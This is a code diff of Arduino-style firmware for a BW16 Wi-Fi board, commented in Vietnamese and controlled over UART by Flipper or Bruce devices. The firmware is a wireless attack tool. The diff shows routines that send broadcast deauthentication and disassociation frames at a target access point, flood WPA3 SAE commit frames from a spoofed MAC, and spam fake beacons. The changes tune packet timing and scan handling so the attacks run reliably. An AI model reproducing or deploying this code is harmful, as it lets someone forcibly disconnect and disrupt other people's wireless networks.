@@ -133,7 +133,7 @@ void handleLedEffects() {
 
 // --- SCAN HANDLER ---
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
-  if (scan_result == NULL) return RTW_SUCCESS;
+  if (scan_result == NULL || !isScanning) return RTW_SUCCESS;
 
   if (scan_result->scan_complete != RTW_TRUE) {
     if (scanCount >= MAX_NETWORKS) return RTW_SUCCESS;
@@ -162,7 +162,9 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
     }
   } else {
     isScanning = false;
-    scanDoneTrigger = true; 
+    if (currentAttack == ATK_NONE) {
+      scanDoneTrigger = true; 
+    }
   }
   return RTW_SUCCESS;
 }
@@ -186,6 +188,8 @@ void stopAttack() {
   currentLedState = LED_OFF;
   setLedColor(0, 0, 0);
   cachedChannel = -1;
+  isScanning = false;
+  scanDoneTrigger = false;
 }
 
 void startScan() {
@@ -196,7 +200,7 @@ void startScan() {
   scanDoneTrigger = false;
   
   // Chờ ngắn để Wi-Fi TX hoàn tất và giải phóng bộ đệm DMA
-  delay(100);
+  delay(150);
 
   int ret = wifi_scan_networks(scanResultHandler, NULL);
   if (ret != RTW_SUCCESS) {
@@ -210,9 +214,9 @@ void startScan() {
   // Khôi phục lại driver Wi-Fi nếu bị kẹt sau quá trình raw packet injection
   if (ret != RTW_SUCCESS) {
     wifi_off();
-    delay(100);
+    delay(200);
     wifi_on(RTW_MODE_STA);
-    delay(150);
+    delay(300);
     ret = wifi_scan_networks(scanResultHandler, NULL);
   }
 
@@ -242,9 +246,6 @@ void setup() {
   wifi_on(RTW_MODE_STA); 
   uartPrintln("\n[BW16 MULTI-TARGET READY]");
   uartPrintln("[UART: Serial0 (PA7/PA8) & Serial1 (PB1/PB2) ACTIVE]");
-
-  delay(300);
-  startScan(); 
 }
 
 // --- ATTACK LOGIC ---
@@ -252,7 +253,7 @@ void setTargetChannel(int ch) {
   if (cachedChannel != ch) {
     wext_set_channel("wlan0", ch);
     cachedChannel = ch;
-    delay(6); // Thời gian cho RF PLL ổn định tần số kênh mới
+    delay(10); // Thời gian cho RF PLL ổn định tần số kênh mới
   }
 }
 
@@ -271,11 +272,11 @@ void atkDeauth() {
 
   // Phát gói tin deauth và disassociation có delay an toàn giữa các gói
   wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2); 
-  delay(4);
+  delay(10);
   wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 7); 
-  delay(4);
+  delay(10);
   wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-  delay(4);
+  delay(10);
 }
 
 void atkWpa3() {
@@ -299,13 +300,13 @@ void atkWpa3() {
 
   // 1. SAE Commit Authentication frame flood
   wifi_tx_sae_commit_frame(target.bssid, spoof_mac);
-  delay(4);
+  delay(10);
 
   // 2. Disassoc & Deauth frame với PMF reason 23
   wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-  delay(4);
+  delay(10);
   wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);
-  delay(4);
+  delay(10);
 }
 
 void atkBeaconRandom() {
@@ -326,7 +327,7 @@ void atkBeaconRandom() {
 
   for (int i = 0; i < 3; i++) {
     wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
-    delay(4);
+    delay(10);
   }
 }
 
@@ -343,13 +344,13 @@ void atkBeaconRickroll() {
 
   wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rick_roll[songIdx]);
   songIdx = (songIdx + 1) % 8;
-  delay(4);
+  delay(10);
 }
 
 void handleAttack() {
-  unsigned long interval = 40; // 40ms giữa các đợt phát (~25 đợt/giây, rất mạnh và không bị nghẽn queue)
-  if (currentAttack == ATK_WPA3) interval = 50;
-  else if (currentAttack == ATK_BEACON_RANDOM || currentAttack == ATK_BEACON_RICKROLL) interval = 40;
+  unsigned long interval = 60; // 60ms giữa các đợt phát, chống nghẽn queue DMA và giữ hệ thống ổn định
+  if (currentAttack == ATK_WPA3) interval = 70;
+  else if (currentAttack == ATK_BEACON_RANDOM || currentAttack == ATK_BEACON_RICKROLL) interval = 60;
 
   if (millis() - packetTimer < interval) return; 
   packetTimer = millis();
@@ -395,10 +396,14 @@ void processCommand(String cmd) {
   
   // 1. Lệnh quét mạng (Bruce "sc" hoặc Flipper "SCAN")
   if (cmd == "sc" || cmd.startsWith("SCAN")) {
-    startScan();
+    if (!isScanning) {
+      startScan();
+    }
   }
   // 2. Lệnh chọn mục tiêu Bruce ("sl:1,2,3" hoặc "sl:0")
   else if (cmd.startsWith("sl:")) {
+    isScanning = false;
+    scanDoneTrigger = false;
     stopAttack();
     selectedCount = 0; 
     
@@ -424,6 +429,8 @@ void processCommand(String cmd) {
   }
   // 3. Lệnh chọn mục tiêu Flipper / Bruce ("DEAUTH 1", "DEAUTH:0" hoặc "DEAUTH ALL")
   else if (cmd.startsWith("DEAUTH")) {
+    isScanning = false;
+    scanDoneTrigger = false;
     String targetStr = "";
     if (cmd.startsWith("DEAUTH:")) targetStr = cmd.substring(7);
     else if (cmd.startsWith("DEAUTH ")) targetStr = cmd.substring(7);
@@ -455,6 +462,8 @@ void processCommand(String cmd) {
   }
   // 4. Lệnh tấn công từ Bruce ("atk:...")
   else if (cmd.startsWith("atk:")) {
+    isScanning = false;
+    scanDoneTrigger = false;
     String type = cmd.substring(4);
     type.trim();
 
@@ -499,12 +508,16 @@ void processCommand(String cmd) {
   }
   // 5. Lệnh Beacon từ RTL8720 / Flipper
   else if (cmd.startsWith("RANDOM") || cmd.startsWith("BEACON:RANDOM")) {
+    isScanning = false;
+    scanDoneTrigger = false;
     currentAttack = ATK_BEACON_RANDOM;
     currentLedState = LED_RED_BLINK;
     cachedChannel = -1;
     uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
   }
   else if (cmd.startsWith("RICKROLL") || cmd.startsWith("BEACON:RICKROLL")) {
+    isScanning = false;
+    scanDoneTrigger = false;
     currentAttack = ATK_BEACON_RICKROLL;
     currentLedState = LED_RED_BLINK;
     cachedChannel = -1;
@@ -556,20 +569,24 @@ void loop() {
     uartPrint("."); 
   }
 
-  // Watchdog an toàn: Nếu scan quá 8 giây mà chưa có scan_complete thì tự hoàn tất
+  // Watchdog an toàn: Nếu scan quá 8 giây mà chưa có scan_complete thì tự hoàn tất (chỉ khi không trong attack)
   if (isScanning && (millis() - scanStartTime > 8000)) {
     isScanning = false;
-    scanDoneTrigger = true;
+    if (currentAttack == ATK_NONE) {
+      scanDoneTrigger = true;
+    }
   }
 
   if (scanDoneTrigger) {
     scanDoneTrigger = false; 
     isScanning = false;
-    uartPrintln(""); 
-    uartPrintln("SCAN:OK");
-    printScanResults();
-    currentLedState = LED_GREEN_WAIT; 
-    scanDoneTime = millis();
+    if (currentAttack == ATK_NONE) {
+      uartPrintln(""); 
+      uartPrintln("SCAN:OK");
+      printScanResults();
+      currentLedState = LED_GREEN_WAIT; 
+      scanDoneTime = millis();
+    }
   }
 
   if (currentAttack != ATK_NONE) handleAttack();
